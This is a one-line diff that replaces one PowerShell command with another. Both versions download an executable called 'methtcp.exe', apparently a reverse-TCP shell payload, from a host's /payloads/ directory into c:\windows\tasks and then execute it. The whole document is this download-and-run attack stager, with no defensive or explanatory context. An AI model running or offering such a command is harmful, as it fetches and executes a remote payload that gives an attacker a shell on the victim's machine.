@@ -1,1 +1,1 @@
-powershell -c (new-object System.Net.WebClient).DownloadFile('http://10.0.0.1/payloads/methtcp.exe','c:\windows\\tasks\methtcp.exe') && c:\windows\\tasks\methtcp.exe
+powershell -c "iwr -Uri 'http://10.2.2.231/payloads/methtcp.exe' -OutFile 'c:\windows\tasks\methtcp.exe' -TimeoutSec 300; c:\windows\tasks\methtcp.exe"
